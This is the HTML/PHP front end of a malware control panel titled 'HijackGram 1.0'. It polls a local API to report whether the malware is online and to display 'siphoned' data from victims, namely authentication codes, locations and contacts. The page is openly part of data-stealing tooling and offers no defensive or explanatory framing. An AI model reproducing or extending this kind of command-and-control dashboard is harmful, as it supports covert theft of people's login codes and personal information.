<!DOCTYPE html>
<html>
<head>
	<title>HijackGram 1.0</title>
	<?php require_once('includes/header/header.php'); ?>
</head>
<body>
	<div class="ui container" style="margin-top: 30px;">
		<div class="ui segment stacked">
			<div class="ui grid">
			  <div class="four wide column"><img class="ui centered image" src="images/logo.png?v=1" style="width:150px !important"></div>
				<div class="ten wide column" id="bodyinfo">
			  </div>
			</div>
		</div>
		<div class="ui segment">
			<h2 class="ui header">
			  Siphon3d Data
			  <div class="sub header">S3curitY Is 0ld Sch00L</div>
			</h2>
			<div class="ui segment" id="resultdata">
		</div>


	</div>
</body>
<script type="text/javascript">
		var processus = []
		var last = ""
		var process_list = ['authcode','location','contact']
		function get_result(process_name)
		{
				console.log('ok')
				$.get('api.php?process_name='+process_name+"&cmd=get&result=1", function(data){
					if(last!= data)
					{
						last = data
						$('#resultdata').html(data)
					}
				})
		}

		function look_process_result()
		{
			$.each(process_list, function(index,value){
				get_result(value)
			})
		}

		function check_status()
		{
			$.get('api.php?status=1', function(data){
				if(data == "0")
				{
					var div = '<h3 class="ui dividing header">HijackGRAM 1.0</h3><div class="ui icon message inverted tiny"><i class="remove red icon"></i><div class="content"><div class="header">Malware</div><p>A malware as been offline</p></div></div>';
					$('#bodyinfo').html(div)
					console.log('ok');
					setTimeout('check_status()', 100)
				}
				else
				{
					var div = '<h3 class="ui dividing header">HijackGRAM 1.0</h3><div class="ui inverted icon message tiny"><i class="bug icon"></i><div class="content"><div class="header">Malware</div><p>Waiting malware extraction</p></div></div>';
					$('#bodyinfo').html(div)
					window.setInterval('look_process_result()',500)

				}
			})
		}
	$(document).ready(function(){
		check_status()

	});
</script>
</html>